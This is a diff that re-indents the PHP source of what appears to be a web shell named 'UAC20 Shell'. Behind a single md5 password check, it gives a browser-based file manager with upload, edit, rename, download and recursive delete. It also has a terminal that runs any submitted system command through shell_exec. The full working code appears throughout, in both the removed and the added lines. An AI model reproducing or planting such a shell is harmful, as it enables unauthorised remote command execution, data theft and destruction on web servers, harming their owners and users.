@@ -12,362 +12,353 @@ define("MAX_UPLOAD_MB", 20);
 session_start();
 
 if (isset($_POST["logout"])) {
-    $_SESSION[SESSION_KEY] = false;
-    header("Location: " . $_SERVER["PHP_SELF"]);
-    exit();
+  $_SESSION[SESSION_KEY] = false;
+  header("Location: " . $_SERVER["PHP_SELF"]);
+  exit();
 }
 
 if (isset($_POST["password"])) {
-    $_SESSION[SESSION_KEY] = md5($_POST["password"]) === PASSWORD_HASH;
-    if (!$_SESSION[SESSION_KEY]) {
-        $loginError = "Incorrect password. Please try again.";
-    }
+  $_SESSION[SESSION_KEY] = md5($_POST["password"]) === PASSWORD_HASH;
+  if (!$_SESSION[SESSION_KEY]) {
+    $loginError = "Incorrect password. Please try again.";
+  }
 }
 
 $isAuthenticated = !empty($_SESSION[SESSION_KEY]);
 
 function safePath(string $path): string|false
 {
-    $real = realpath($path);
-    if ($real === false) {
-        $parent = realpath(dirname($path));
-        if ($parent === false || strpos($parent, ROOT_DIR) !== 0) {
-            return false;
-        }
-        return $parent . DIRECTORY_SEPARATOR . basename($path);
+  $real = realpath($path);
+  if ($real === false) {
+    $parent = realpath(dirname($path));
+    if ($parent === false || strpos($parent, ROOT_DIR) !== 0) {
+      return false;
     }
-    if (strpos($real, ROOT_DIR) !== 0) {
-        return false;
-    }
-    return $real;
+    return $parent . DIRECTORY_SEPARATOR . basename($path);
+  }
+  if (strpos($real, ROOT_DIR) !== 0) {
+    return false;
+  }
+  return $real;
 }
 
 function resolveParam(string $param): string|false
 {
-    return safePath(ROOT_DIR . DIRECTORY_SEPARATOR . ltrim($param, "/\\"));
+  return safePath(ROOT_DIR . DIRECTORY_SEPARATOR . ltrim($param, "/\\"));
 }
 
 function formatBytes(int $bytes): string
 {
-    if ($bytes >= 1073741824) {
-        return round($bytes / 1073741824, 2) . " GB";
-    }
-    if ($bytes >= 1048576) {
-        return round($bytes / 1048576, 2) . " MB";
-    }
-    if ($bytes >= 1024) {
-        return round($bytes / 1024, 2) . " KB";
-    }
-    return $bytes . " B";
+  if ($bytes >= 1073741824) {
+    return round($bytes / 1073741824, 2) . " GB";
+  }
+  if ($bytes >= 1048576) {
+    return round($bytes / 1048576, 2) . " MB";
+  }
+  if ($bytes >= 1024) {
+    return round($bytes / 1024, 2) . " KB";
+  }
+  return $bytes . " B";
 }
 
 function relativePath(string $abs): string
 {
-    $rel = str_replace(ROOT_DIR, "", $abs);
-    return "/" . ltrim(str_replace("\\", "/", $rel), "/");
+  $rel = str_replace(ROOT_DIR, "", $abs);
+  return "/" . ltrim(str_replace("\\", "/", $rel), "/");
 }
 
 function fileCategory(string $path): string
 {
-    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-    $map = [
-        "image" => ["jpg", "jpeg", "png", "gif", "webp", "svg", "ico", "bmp"],
-        "code" => [
-            "php",
-            "js",
-            "ts",
-            "jsx",
-            "tsx",
-            "css",
-            "html",
-            "htm",
-            "json",
-            "xml",
-            "yaml",
-            "yml",
-            "sh",
-            "py",
-            "rb",
-            "go",
-            "rs",
-            "java",
-            "c",
-            "cpp",
-            "h",
-        ],
-        "text" => ["txt", "md", "log", "csv", "ini", "env", "conf"],
-        "archive" => ["zip", "tar", "gz", "bz2", "rar", "7z"],
-        "video" => ["mp4", "mkv", "avi", "mov", "webm"],
-        "audio" => ["mp3", "wav", "ogg", "flac", "aac"],
-        "pdf" => ["pdf"],
-    ];
-    foreach ($map as $cat => $exts) {
-        if (in_array($ext, $exts, true)) {
-            return $cat;
-        }
+  $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+  $map = [
+    "image" => ["jpg", "jpeg", "png", "gif", "webp", "svg", "ico", "bmp"],
+    "code" => [
+      "php",
+      "js",
+      "ts",
+      "jsx",
+      "tsx",
+      "css",
+      "html",
+      "htm",
+      "json",
+      "xml",
+      "yaml",
+      "yml",
+      "sh",
+      "py",
+      "rb",
+      "go",
+      "rs",
+      "java",
+      "c",
+      "cpp",
+      "h",
+    ],
+    "text" => ["txt", "md", "log", "csv", "ini", "env", "conf"],
+    "archive" => ["zip", "tar", "gz", "bz2", "rar", "7z"],
+    "video" => ["mp4", "mkv", "avi", "mov", "webm"],
+    "audio" => ["mp3", "wav", "ogg", "flac", "aac"],
+    "pdf" => ["pdf"],
+  ];
+  foreach ($map as $cat => $exts) {
+    if (in_array($ext, $exts, true)) {
+      return $cat;
     }
-    return "other";
+  }
+  return "other";
 }
 
 function isTextEditable(string $path): bool
 {
-    return in_array(fileCategory($path), ["code", "text"], true);
+  return in_array(fileCategory($path), ["code", "text"], true);
 }
 
 if ($isAuthenticated && isset($_POST["term_cmd"])) {
-    header("Content-Type: application/json");
+  header("Content-Type: application/json");
 
-    $cmd = trim($_POST["term_cmd"] ?? "");
-    $cwd = $_POST["term_cwd"] ?? ROOT_DIR;
-    if (!is_dir($cwd) || strpos(realpath($cwd), ROOT_DIR) !== 0) {
-        $cwd = ROOT_DIR;
-    }
+  $cmd = trim($_POST["term_cmd"] ?? "");
+  $cwd = $_POST["term_cwd"] ?? ROOT_DIR;
+  if (!is_dir($cwd) || strpos(realpath($cwd), ROOT_DIR) !== 0) {
+    $cwd = ROOT_DIR;
+  }
 
-    if ($cmd === "") {
-        echo json_encode(["output" => "", "cwd" => $cwd, "isError" => false]);
-        exit();
-    }
+  if ($cmd === "") {
+    echo json_encode(["output" => "", "cwd" => $cwd, "isError" => false]);
+    exit();
+  }
 
-    if ($cmd === "clear") {
-        echo json_encode([
-            "output" => "__CLEAR__",
-            "cwd" => $cwd,
-            "isError" => false,
-        ]);
-        exit();
-    }
-
-    $disabled = array_map("trim", explode(",", ini_get("disable_functions")));
-    $canExec =
-        !in_array("shell_exec", $disabled) && function_exists("shell_exec");
-
-    if (!$canExec) {
-        echo json_encode([
-            "output" => "shell_exec is disabled on this server.",
-            "cwd" => $cwd,
-            "isError" => true,
-        ]);
-        exit();
-    }
-
-    $fullCmd =
-        "cd " .
-        escapeshellarg($cwd) .
-        " && " .
-        $cmd .
-        ' 2>&1; echo "__EXIT__$?"';
-    $raw = shell_exec($fullCmd);
-
-    $exitCode = 0;
-    $output = $raw;
-
-    if (preg_match('/^(.*?)__EXIT__(\d+)\s*$/s', $raw, $m)) {
-        $output = $m[1];
-        $exitCode = (int) $m[2];
-    }
-
-    $output = rtrim($output);
-
-    $newCwd = $cwd;
-    if (preg_match('/^cd\s+(.+)$/i', trim($cmd), $cdm) || $cmd === "cd") {
-        $cdDir = $cmd === "cd" ? ROOT_DIR : trim($cdm[1]);
-        $cdDir = $cdDir[0] === "/" ? $cdDir : $cwd . "/" . $cdDir;
-        $cdReal = realpath($cdDir);
-        if ($cdReal && is_dir($cdReal) && strpos($cdReal, ROOT_DIR) === 0) {
-            $newCwd = $cdReal;
-        }
-    }
-
+  if ($cmd === "clear") {
     echo json_encode([
-        "output" => $output,
-        "cwd" => $newCwd,
-        "isError" => $exitCode !== 0,
+      "output" => "__CLEAR__",
+      "cwd" => $cwd,
+      "isError" => false,
     ]);
     exit();
+  }
+
+  $disabled = array_map("trim", explode(",", ini_get("disable_functions")));
+  $canExec =
+    !in_array("shell_exec", $disabled) && function_exists("shell_exec");
+
+  if (!$canExec) {
+    echo json_encode([
+      "output" => "shell_exec is disabled on this server.",
+      "cwd" => $cwd,
+      "isError" => true,
+    ]);
+    exit();
+  }
+
+  $fullCmd =
+    "cd " . escapeshellarg($cwd) . " && " . $cmd . ' 2>&1; echo "__EXIT__$?"';
+  $raw = shell_exec($fullCmd);
+
+  $exitCode = 0;
+  $output = $raw;
+
+  if (preg_match('/^(.*?)__EXIT__(\d+)\s*$/s', $raw, $m)) {
+    $output = $m[1];
+    $exitCode = (int) $m[2];
+  }
+
+  $output = rtrim($output);
+
+  $newCwd = $cwd;
+  if (preg_match('/^cd\s+(.+)$/i', trim($cmd), $cdm) || $cmd === "cd") {
+    $cdDir = $cmd === "cd" ? ROOT_DIR : trim($cdm[1]);
+    $cdDir = $cdDir[0] === "/" ? $cdDir : $cwd . "/" . $cdDir;
+    $cdReal = realpath($cdDir);
+    if ($cdReal && is_dir($cdReal) && strpos($cdReal, ROOT_DIR) === 0) {
+      $newCwd = $cdReal;
+    }
+  }
+
+  echo json_encode([
+    "output" => $output,
+    "cwd" => $newCwd,
+    "isError" => $exitCode !== 0,
+  ]);
+  exit();
 }
 
 $message = "";
 $messageType = "success";
 
 if ($isAuthenticated) {
-    $action = $_POST["action"] ?? ($_GET["action"] ?? "");
+  $action = $_POST["action"] ?? ($_GET["action"] ?? "");
 
-    if ($action === "delete") {
-        $target = resolveParam($_POST["path"] ?? "");
-        if (!$target) {
-            $message = "Invalid path.";
-            $messageType = "error";
-        } elseif (is_dir($target)) {
-            $it = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator(
-                    $target,
-                    FilesystemIterator::SKIP_DOTS
-                ),
-                RecursiveIteratorIterator::CHILD_FIRST
-            );
-            foreach ($it as $entry) {
-                $entry->isDir()
-                    ? rmdir($entry->getRealPath())
-                    : unlink($entry->getRealPath());
-            }
-            rmdir($target);
-            $message = "Directory deleted successfully.";
-        } elseif (is_file($target)) {
-            unlink($target);
-            $message = "File deleted successfully.";
-        } else {
-            $message = "Target not found.";
-            $messageType = "error";
-        }
+  if ($action === "delete") {
+    $target = resolveParam($_POST["path"] ?? "");
+    if (!$target) {
+      $message = "Invalid path.";
+      $messageType = "error";
+    } elseif (is_dir($target)) {
+      $it = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::CHILD_FIRST
+      );
+      foreach ($it as $entry) {
+        $entry->isDir()
+          ? rmdir($entry->getRealPath())
+          : unlink($entry->getRealPath());
+      }
+      rmdir($target);
+      $message = "Directory deleted successfully.";
+    } elseif (is_file($target)) {
+      unlink($target);
+      $message = "File deleted successfully.";
+    } else {
+      $message = "Target not found.";
+      $messageType = "error";
     }
+  }
 
-    if ($action === "create_file") {
-        $dir = resolveParam($_POST["dir"] ?? "");
-        $name = basename($_POST["name"] ?? "");
-        if (!$dir || !$name) {
-            $message = "Invalid directory or filename.";
-            $messageType = "error";
-        } else {
-            $newPath = $dir . DIRECTORY_SEPARATOR . $name;
-            if (file_exists($newPath)) {
-                $message = "A file with that name already exists.";
-                $messageType = "error";
-            } else {
-                file_put_contents($newPath, "");
-                $message = "File '{$name}' created.";
-            }
-        }
+  if ($action === "create_file") {
+    $dir = resolveParam($_POST["dir"] ?? "");
+    $name = basename($_POST["name"] ?? "");
+    if (!$dir || !$name) {
+      $message = "Invalid directory or filename.";
+      $messageType = "error";
+    } else {
+      $newPath = $dir . DIRECTORY_SEPARATOR . $name;
+      if (file_exists($newPath)) {
+        $message = "A file with that name already exists.";
+        $messageType = "error";
+      } else {
+        file_put_contents($newPath, "");
+        $message = "File '{$name}' created.";
+      }
     }
+  }
 
-    if ($action === "create_dir") {
-        $dir = resolveParam($_POST["dir"] ?? "");
-        $name = basename($_POST["name"] ?? "");
-        if (!$dir || !$name) {
-            $message = "Invalid path or directory name.";
-            $messageType = "error";
-        } else {
-            $newPath = $dir . DIRECTORY_SEPARATOR . $name;
-            if (file_exists($newPath)) {
-                $message = "A directory with that name already exists.";
-                $messageType = "error";
-            } else {
-                mkdir($newPath, 0755, true);
-                $message = "Directory '{$name}' created.";
-            }
-        }
+  if ($action === "create_dir") {
+    $dir = resolveParam($_POST["dir"] ?? "");
+    $name = basename($_POST["name"] ?? "");
+    if (!$dir || !$name) {
+      $message = "Invalid path or directory name.";
+      $messageType = "error";
+    } else {
+      $newPath = $dir . DIRECTORY_SEPARATOR . $name;
+      if (file_exists($newPath)) {
+        $message = "A directory with that name already exists.";
+        $messageType = "error";
+      } else {
+        mkdir($newPath, 0755, true);
+        $message = "Directory '{$name}' created.";
+      }
     }
+  }
 
-    if ($action === "save_file") {
-        $target = resolveParam($_POST["path"] ?? "");
-        $content = $_POST["content"] ?? "";
-        if (!$target || !is_file($target)) {
-            $message = "Invalid file path.";
-            $messageType = "error";
-        } else {
-            file_put_contents($target, $content);
-            $message = "File saved successfully.";
-        }
+  if ($action === "save_file") {
+    $target = resolveParam($_POST["path"] ?? "");
+    $content = $_POST["content"] ?? "";
+    if (!$target || !is_file($target)) {
+      $message = "Invalid file path.";
+      $messageType = "error";
+    } else {
+      file_put_contents($target, $content);
+      $message = "File saved successfully.";
     }
+  }
 
-    if ($action === "rename") {
-        $target = resolveParam($_POST["path"] ?? "");
-        $newName = basename($_POST["new_name"] ?? "");
-        if (!$target || !$newName) {
-            $message = "Invalid path or name.";
-            $messageType = "error";
-        } else {
-            $dest = dirname($target) . DIRECTORY_SEPARATOR . $newName;
-            rename($target, $dest);
-            $message = "Renamed to '{$newName}'.";
-        }
+  if ($action === "rename") {
+    $target = resolveParam($_POST["path"] ?? "");
+    $newName = basename($_POST["new_name"] ?? "");
+    if (!$target || !$newName) {
+      $message = "Invalid path or name.";
+      $messageType = "error";
+    } else {
+      $dest = dirname($target) . DIRECTORY_SEPARATOR . $newName;
+      rename($target, $dest);
+      $message = "Renamed to '{$newName}'.";
     }
+  }
 
-    if ($action === "upload" && isset($_FILES["upload_file"])) {
-        $dir = resolveParam($_POST["dir"] ?? "");
-        $file = $_FILES["upload_file"];
-        if (!$dir) {
-            $message = "Invalid upload directory.";
-            $messageType = "error";
-        } elseif ($file["error"] !== UPLOAD_ERR_OK) {
-            $message = "Upload failed.";
-            $messageType = "error";
-        } elseif ($file["size"] > MAX_UPLOAD_MB * 1048576) {
-            $message = "File exceeds " . MAX_UPLOAD_MB . " MB limit.";
-            $messageType = "error";
-        } else {
-            $dest = $dir . DIRECTORY_SEPARATOR . basename($file["name"]);
-            move_uploaded_file($file["tmp_name"], $dest);
-            $message = "'{$file["name"]}' uploaded successfully.";
-        }
+  if ($action === "upload" && isset($_FILES["upload_file"])) {
+    $dir = resolveParam($_POST["dir"] ?? "");
+    $file = $_FILES["upload_file"];
+    if (!$dir) {
+      $message = "Invalid upload directory.";
+      $messageType = "error";
+    } elseif ($file["error"] !== UPLOAD_ERR_OK) {
+      $message = "Upload failed.";
+      $messageType = "error";
+    } elseif ($file["size"] > MAX_UPLOAD_MB * 1048576) {
+      $message = "File exceeds " . MAX_UPLOAD_MB . " MB limit.";
+      $messageType = "error";
+    } else {
+      $dest = $dir . DIRECTORY_SEPARATOR . basename($file["name"]);
+      move_uploaded_file($file["tmp_name"], $dest);
+      $message = "'{$file["name"]}' uploaded successfully.";
     }
+  }
 
-    if ($action === "download") {
-        $target = resolveParam($_GET["path"] ?? "");
-        if ($target && is_file($target)) {
-            header("Content-Type: application/octet-stream");
-            header(
-                'Content-Disposition: attachment; filename="' .
-                    basename($target) .
-                    '"'
-            );
-            header("Content-Length: " . filesize($target));
-            readfile($target);
-            exit();
-        }
+  if ($action === "download") {
+    $target = resolveParam($_GET["path"] ?? "");
+    if ($target && is_file($target)) {
+      header("Content-Type: application/octet-stream");
+      header(
+        'Content-Disposition: attachment; filename="' . basename($target) . '"'
+      );
+      header("Content-Length: " . filesize($target));
+      readfile($target);
+      exit();
     }
+  }
 }
 
 $currentDirParam = $_GET["dir"] ?? "";
 $currentDir = $isAuthenticated
-    ? (resolveParam($currentDirParam) ?:
-    ROOT_DIR)
-    : ROOT_DIR;
+  ? (resolveParam($currentDirParam) ?:
+  ROOT_DIR)
+  : ROOT_DIR;
 if (!is_dir($currentDir)) {
-    $currentDir = ROOT_DIR;
+  $currentDir = ROOT_DIR;
 }
 
 $editFilePath = "";
 $editFileContent = "";
 
 if ($isAuthenticated && isset($_GET["edit"])) {
-    $ep = resolveParam($_GET["edit"]);
-    if ($ep && is_file($ep) && isTextEditable($ep)) {
-        $editFilePath = $ep;
-        $editFileContent = file_get_contents($ep);
-    }
+  $ep = resolveParam($_GET["edit"]);
+  if ($ep && is_file($ep) && isTextEditable($ep)) {
+    $editFilePath = $ep;
+    $editFileContent = file_get_contents($ep);
+  }
 }
 
 $dirs = [];
 $files = [];
 
 if ($isAuthenticated) {
-    foreach (new DirectoryIterator($currentDir) as $item) {
-        if ($item->isDot()) {
-            continue;
-        }
-        $info = [
-            "name" => $item->getFilename(),
-            "path" => relativePath($item->getRealPath()),
-            "abs" => $item->getRealPath(),
-            "size" => $item->isFile() ? $item->getSize() : 0,
-            "mtime" => $item->getMTime(),
-            "writable" => is_writable($item->getRealPath()),
-            "category" => $item->isFile()
-                ? fileCategory($item->getRealPath())
-                : "dir",
-        ];
-        $item->isDir() ? ($dirs[] = $info) : ($files[] = $info);
+  foreach (new DirectoryIterator($currentDir) as $item) {
+    if ($item->isDot()) {
+      continue;
     }
-    usort($dirs, fn($a, $b) => strcmp($a["name"], $b["name"]));
-    usort($files, fn($a, $b) => strcmp($a["name"], $b["name"]));
+    $info = [
+      "name" => $item->getFilename(),
+      "path" => relativePath($item->getRealPath()),
+      "abs" => $item->getRealPath(),
+      "size" => $item->isFile() ? $item->getSize() : 0,
+      "mtime" => $item->getMTime(),
+      "writable" => is_writable($item->getRealPath()),
+      "category" => $item->isFile()
+        ? fileCategory($item->getRealPath())
+        : "dir",
+    ];
+    $item->isDir() ? ($dirs[] = $info) : ($files[] = $info);
+  }
+  usort($dirs, fn($a, $b) => strcmp($a["name"], $b["name"]));
+  usort($files, fn($a, $b) => strcmp($a["name"], $b["name"]));
 }
 
 $breadcrumbs = [["label" => "Root", "path" => "/"]];
 $relCurrent = relativePath($currentDir);
 $accum = "";
 foreach (array_filter(explode("/", trim($relCurrent, "/"))) as $seg) {
-    $accum .= "/" . $seg;
-    $breadcrumbs[] = ["label" => $seg, "path" => $accum];
+  $accum .= "/" . $seg;
+  $breadcrumbs[] = ["label" => $seg, "path" => $accum];
 }
 ?>
 <!DOCTYPE html>
@@ -785,7 +776,7 @@ textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: v
         </div>
         <div class="topbar-sep"></div>
         <span class="topbar-path mono"><?= htmlspecialchars(
-            relativePath($currentDir)
+          relativePath($currentDir)
         ) ?></span>
         <div style="margin-left:auto;display:flex;gap:.5rem;align-items:center;flex-wrap:wrap">
             <span class="cell-mono" style="color:var(--white5);font-size:.7rem">
@@ -804,8 +795,8 @@ textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: v
         <?php if ($message): ?>
             <div class="alert alert-<?= $messageType ?>">
                 <i class="fa-solid fa-<?= $messageType === "success"
-                    ? "circle-check"
-                    : "circle-xmark" ?>"></i>
+                  ? "circle-check"
+                  : "circle-xmark" ?>"></i>
                 <?= htmlspecialchars($message) ?>
             </div>
         <?php endif; ?>
@@ -814,15 +805,15 @@ textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: v
             <i class="fa-solid fa-folder-tree" style="color:var(--red);margin-right:.2rem"></i>
             <?php foreach ($breadcrumbs as $i => $crumb): ?>
                 <?php if (
-                    $i > 0
+                  $i > 0
                 ): ?><span class="bc-sep">/</span><?php endif; ?>
                 <?php if ($i === count($breadcrumbs) - 1): ?>
                     <span class="bc-cur"><?= htmlspecialchars(
-                        $crumb["label"]
+                      $crumb["label"]
                     ) ?></span>
                 <?php else: ?>
                     <a href="?dir=<?= urlencode(
-                        $crumb["path"]
+                      $crumb["path"]
                     ) ?>"><?= htmlspecialchars($crumb["label"]) ?></a>
                 <?php endif; ?>
             <?php endforeach; ?>
@@ -842,7 +833,7 @@ textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: v
             <div class="toolbar">
                 <?php if ($currentDir !== ROOT_DIR): ?>
                     <a href="?dir=<?= urlencode(
-                        relativePath(dirname($currentDir))
+                      relativePath(dirname($currentDir))
                     ) ?>" class="btn btn-ghost btn-sm">
                         <i class="fa-solid fa-arrow-left"></i> Up
                     </a>
@@ -871,13 +862,13 @@ textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: v
                 <div class="stat-chip">
                     <i class="fa-solid fa-database"></i>
                     <span><strong><?= formatBytes(
-                        array_sum(array_column($files, "size"))
+                      array_sum(array_column($files, "size"))
                     ) ?></strong></span>
                 </div>
                 <div class="stat-chip">
                     <i class="fa-solid fa-server"></i>
                     <span><strong><?= htmlspecialchars(
-                        $_SERVER["SERVER_SOFTWARE"] ?? "Unknown"
+                      $_SERVER["SERVER_SOFTWARE"] ?? "Unknown"
                     ) ?></strong></span>
                 </div>
             </div>
@@ -898,25 +889,25 @@ textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: v
 <?php
 function renderRow(array $item, bool $isDir): void
 {
-    $cat = $isDir ? "dir" : $item["category"];
-    $iconMap = [
-        "dir" => ["fa-folder", "icon-dir"],
-        "image" => ["fa-image", "icon-image"],
-        "code" => ["fa-code", "icon-code"],
-        "text" => ["fa-file-lines", "icon-text"],
-        "archive" => ["fa-file-zipper", "icon-archive"],
-        "pdf" => ["fa-file-pdf", "icon-pdf"],
-        "video" => ["fa-file-video", "icon-other"],
-        "audio" => ["fa-file-audio", "icon-other"],
-        "other" => ["fa-file", "icon-other"],
-    ];
-    [$faClass, $iconClass] = $iconMap[$cat] ?? $iconMap["other"];
+  $cat = $isDir ? "dir" : $item["category"];
+  $iconMap = [
+    "dir" => ["fa-folder", "icon-dir"],
+    "image" => ["fa-image", "icon-image"],
+    "code" => ["fa-code", "icon-code"],
+    "text" => ["fa-file-lines", "icon-text"],
+    "archive" => ["fa-file-zipper", "icon-archive"],
+    "pdf" => ["fa-file-pdf", "icon-pdf"],
+    "video" => ["fa-file-video", "icon-other"],
+    "audio" => ["fa-file-audio", "icon-other"],
+    "other" => ["fa-file", "icon-other"],
+  ];
+  [$faClass, $iconClass] = $iconMap[$cat] ?? $iconMap["other"];
 
-    $encodedPath = htmlspecialchars(urlencode($item["path"]), ENT_QUOTES);
-    $displayPath = htmlspecialchars($item["path"], ENT_QUOTES);
-    $displayName = htmlspecialchars($item["name"]);
-    $ext = strtoupper(pathinfo($item["name"], PATHINFO_EXTENSION) ?: "—");
-    ?>
+  $encodedPath = htmlspecialchars(urlencode($item["path"]), ENT_QUOTES);
+  $displayPath = htmlspecialchars($item["path"], ENT_QUOTES);
+  $displayName = htmlspecialchars($item["name"]);
+  $ext = strtoupper(pathinfo($item["name"], PATHINFO_EXTENSION) ?: "—");
+  ?>
                     <tr>
                         <td>
                             <div class="file-name-cell">
@@ -932,27 +923,27 @@ function renderRow(array $item, bool $isDir): void
                         </td>
                         <td><span class="cat-tag cat-<?= $cat ?>"><?= $isDir ? "DIR" : $ext ?></span></td>
                         <td class="cell-mono col-size"><?= $isDir
-                            ? "&mdash;"
-                            : formatBytes($item["size"]) ?></td>
+                          ? "&mdash;"
+                          : formatBytes($item["size"]) ?></td>
                         <td class="cell-mono col-mtime"><?= date(
-                            "d/m/Y H:i",
-                            $item["mtime"]
+                          "d/m/Y H:i",
+                          $item["mtime"]
                         ) ?></td>
                         <td class="col-perm">
                             <span class="perm-badge <?= $item["writable"]
-                                ? "perm-write"
-                                : "perm-read" ?>">
+                              ? "perm-write"
+                              : "perm-read" ?>">
                                 <i class="fa-solid fa-<?= $item["writable"]
-                                    ? "lock-open"
-                                    : "lock" ?> fa-xs"></i>
+                                  ? "lock-open"
+                                  : "lock" ?> fa-xs"></i>
                                 <?= $item["writable"] ? "rw" : "ro" ?>
                             </span>
                         </td>
                         <td>
                             <div class="action-group">
                                 <?php if (
-                                    !$isDir &&
-                                    isTextEditable($item["abs"])
+                                  !$isDir &&
+                                  isTextEditable($item["abs"])
                                 ): ?>
                                     <a href="?edit=<?= $encodedPath ?>" class="btn btn-primary btn-sm">
                                         <i class="fa-solid fa-pen"></i>
@@ -981,10 +972,10 @@ function renderRow(array $item, bool $isDir): void
 }
 
 foreach ($dirs as $item) {
-    renderRow($item, true);
+  renderRow($item, true);
 }
 foreach ($files as $item) {
-    renderRow($item, false);
+  renderRow($item, false);
 }
 
 if (empty($dirs) && empty($files)): ?>
@@ -1008,7 +999,7 @@ if (empty($dirs) && empty($files)): ?>
                     <i class="fa-solid fa-code" style="color:var(--red)"></i>
                     <span style="font-weight:700;font-size:.88rem">Editing</span>
                     <span class="editor-path"><?= htmlspecialchars(
-                        relativePath($editFilePath)
+                      relativePath($editFilePath)
                     ) ?></span>
                     <a href="?dir=<?= urlencode(relativePath($currentDir)) ?>"
                        class="btn btn-ghost btn-sm" style="margin-left:auto">
@@ -1019,16 +1010,16 @@ if (empty($dirs) && empty($files)): ?>
                     <input type="hidden" name="action" value="save_file">
                     <input type="hidden" name="path"
                            value="<?= htmlspecialchars(
-                               relativePath($editFilePath),
-                               ENT_QUOTES
+                             relativePath($editFilePath),
+                             ENT_QUOTES
                            ) ?>">
                     <textarea class="code-editor" name="content"
                               spellcheck="false"><?= htmlspecialchars(
-                                  $editFileContent
+                                $editFileContent
                               ) ?></textarea>
                     <div class="editor-footer">
                         <a href="?dir=<?= urlencode(
-                            relativePath($currentDir)
+                          relativePath($currentDir)
                         ) ?>"
                            class="btn btn-ghost btn-sm">
                             <i class="fa-solid fa-xmark"></i> Cancel
@@ -1051,7 +1042,7 @@ if (empty($dirs) && empty($files)): ?>
                     <span class="term-dot term-dot-g"></span>
                     <span class="term-title"><i class="fa-solid fa-terminal" style="color:var(--red);margin-right:.3rem"></i>Terminal</span>
                     <span class="term-cwd" id="term-cwd-badge"><?= htmlspecialchars(
-                        relativePath($currentDir)
+                      relativePath($currentDir)
                     ) ?></span>
                     <button class="term-clear-btn" onclick="clearTerm()">
                         <i class="fa-solid fa-eraser"></i> clear
@@ -1059,9 +1050,9 @@ if (empty($dirs) && empty($files)): ?>
                 </div>
                 <div class="term-output" id="term-output">
                     <div class="term-line info-line">UAC20 Shell — connected to <?= htmlspecialchars(
-                        php_uname("n")
+                      php_uname("n")
                     ) ?> as <?= htmlspecialchars(
-     function_exists("get_current_user") ? get_current_user() : "www-data"
+   function_exists("get_current_user") ? get_current_user() : "www-data"
  ) ?>. Type any system command freely.</div>
                 </div>
                 <div class="term-input-row">
@@ -1089,8 +1080,8 @@ if (empty($dirs) && empty($files)): ?>
         <form method="POST">
             <input type="hidden" name="action" value="create_file">
             <input type="hidden" name="dir" value="<?= htmlspecialchars(
-                relativePath($currentDir),
-                ENT_QUOTES
+              relativePath($currentDir),
+              ENT_QUOTES
             ) ?>">
             <div class="field-group">
                 <label class="field-label">Filename</label>
@@ -1110,8 +1101,8 @@ if (empty($dirs) && empty($files)): ?>
         <form method="POST">
             <input type="hidden" name="action" value="create_dir">
             <input type="hidden" name="dir" value="<?= htmlspecialchars(
-                relativePath($currentDir),
-                ENT_QUOTES
+              relativePath($currentDir),
+              ENT_QUOTES
             ) ?>">
             <div class="field-group">
                 <label class="field-label">Folder Name</label>
@@ -1131,8 +1122,8 @@ if (empty($dirs) && empty($files)): ?>
         <form method="POST" enctype="multipart/form-data">
             <input type="hidden" name="action" value="upload">
             <input type="hidden" name="dir" value="<?= htmlspecialchars(
-                relativePath($currentDir),
-                ENT_QUOTES
+              relativePath($currentDir),
+              ENT_QUOTES
             ) ?>">
             <div class="field-group">
                 <label class="upload-zone" for="upload-input">
@@ -1283,7 +1274,7 @@ function updatePrompt() {
     const badge = document.getElementById('term-cwd-badge');
     const label = document.getElementById('term-prompt');
     const display = termState.cwd.replace('<?= addslashes(
-        ROOT_DIR
+      ROOT_DIR
     ) ?>', '') || '/';
     if (badge) badge.textContent = display;
     if (label) label.textContent = display + ' $ ';
@@ -1299,7 +1290,7 @@ function sendTermCmd(rawCmd) {
     termState.hIdx = -1;
 
     const display = termState.cwd.replace('<?= addslashes(
-        ROOT_DIR
+      ROOT_DIR
     ) ?>', '') || '/';
     const promptEl = document.createElement('div');
     promptEl.className = 'term-line cmd-line';
